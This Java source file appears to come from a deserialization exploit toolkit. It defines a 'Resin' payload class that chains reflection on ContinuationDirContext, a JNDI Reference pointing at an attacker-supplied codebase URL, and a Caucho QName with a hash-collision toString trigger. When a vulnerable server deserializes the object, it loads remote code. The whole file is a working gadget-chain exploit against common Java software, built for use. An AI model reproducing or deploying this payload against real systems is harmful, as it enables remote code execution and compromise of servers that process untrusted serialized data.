package com.qi4l.JYso.gadgets;

import com.caucho.naming.QName;
import com.qi4l.JYso.gadgets.utils.Reflections;
import com.sun.org.apache.xpath.internal.objects.XString;

import javax.naming.CannotProceedException;
import javax.naming.Reference;
import javax.naming.directory.DirContext;
import java.lang.reflect.Constructor;
import java.net.URI;
import java.util.Hashtable;

public class Resin implements ObjectPayload<Object>{
    @Override
    public Object getObject(String command) throws Exception {
        //需要处理command
        return makeResinQName(command);
    }
    public Object makeResinQName(String command) throws Exception {
        Class<?> ccCl = Class.forName("javax.naming.spi.ContinuationDirContext"); //$NON-NLS-1$
        Constructor<?> ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);
        ccCons.setAccessible(true);
        CannotProceedException cpe = new CannotProceedException();
        Reflections.setFieldValue(cpe, "cause", null);
        Reflections.setFieldValue(cpe, "stackTrace", null);
        //考虑换成其他的
        URI uri = new URI(command);
        String args[] = {uri.getScheme() + "://" + uri.getAuthority(), uri.getPath().substring(1)};
        cpe.setResolvedObj(new Reference("Foo", args[ 1 ], args[ 0 ]));

        Reflections.setFieldValue(cpe, "suppressedExceptions", null);
        DirContext ctx = (DirContext) ccCons.newInstance(cpe, new Hashtable<>());
        QName qName = new QName(ctx, "foo", "bar");
        return makeToStringTrigger(qName);
    }

    public static Object makeToStringTrigger ( Object o ) throws Exception {
        String unhash = unhash(o.hashCode());
        XString xString = new XString(unhash);
        return JDKUtil.makeMap(o, xString);
    }

    public static String unhash ( int hash ) {
        int target = hash;
        StringBuilder answer = new StringBuilder();
        if ( target < 0 ) {
            // String with hash of Integer.MIN_VALUE, 0x80000000
            answer.append("\\u0915\\u0009\\u001e\\u000c\\u0002");

            if ( target == Integer.MIN_VALUE )
                return answer.toString();
            // Find target without sign bit set
            target = target & Integer.MAX_VALUE;
        }

        unhash0(answer, target);
        return answer.toString();
    }

    private static void unhash0 ( StringBuilder partial, int target ) {
        int div = target / 31;
        int rem = target % 31;

        if ( div <= Character.MAX_VALUE ) {
            if ( div != 0 )
                partial.append((char) div);
            partial.append((char) rem);
        }
        else {
            unhash0(partial, div);
            partial.append((char) rem);
        }
    }

}
